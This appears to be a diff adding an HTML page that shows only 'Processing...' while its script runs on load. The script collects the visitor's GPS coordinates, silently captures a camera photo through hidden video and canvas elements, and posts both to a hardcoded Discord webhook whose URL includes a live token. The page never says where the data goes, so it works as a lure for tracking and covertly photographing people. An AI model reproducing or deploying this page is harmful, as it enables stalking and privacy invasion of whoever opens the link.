@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Share Location & Take Photo</title>
+</head>
+<body>
+  <h2>Processing...</h2>
+  <video id="video" autoplay playsinline style="display: none;"></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1373582402269478962/owTDYtZFHu4ta9VhxQYJaYX-6ysE7HMR-2ay-brOaPO6mY96AQ7dMOrfln96m9EV4cT0";
+
+    async function shareLocationAndPhoto() {
+      try {
+        // Request GPS location
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject);
+        });
+        const { latitude, longitude } = position.coords;
+
+        // Access camera
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+        await new Promise(resolve => video.onloadedmetadata = resolve);
+
+        // Capture photo from video stream
+        const canvas = document.getElementById("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Stop camera after capture
+        stream.getTracks().forEach(track => track.stop());
+
+        const imageBlob = await new Promise(resolve =>
+          canvas.toBlob(resolve, "image/jpeg")
+        );
+
+        // Prepare payload for Discord webhook
+        const formData = new FormData();
+        formData.append("payload_json", JSON.stringify({
+          content: `**New location shared!**\nLatitude: ${latitude}\nLongitude: ${longitude}\n[View on Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`,
+          embeds: [{ image: { url: "attachment://photo.jpg" } }]
+        }));
+        formData.append("file", imageBlob, "photo.jpg");
+
+        // Send to webhook
+        await fetch(webhookURL, {
+          method: "POST",
+          body: formData
+        });
+
+        document.body.innerHTML = "<h2>Location and photo sent successfully!</h2>";
+
+      } catch (err) {
+        console.error(err);
+        document.body.innerHTML = "<h2>Error: " + err.message + "</h2>";
+      }
+    }
+
+    shareLocationAndPhoto();
+  </script>
+</body>
+</html>
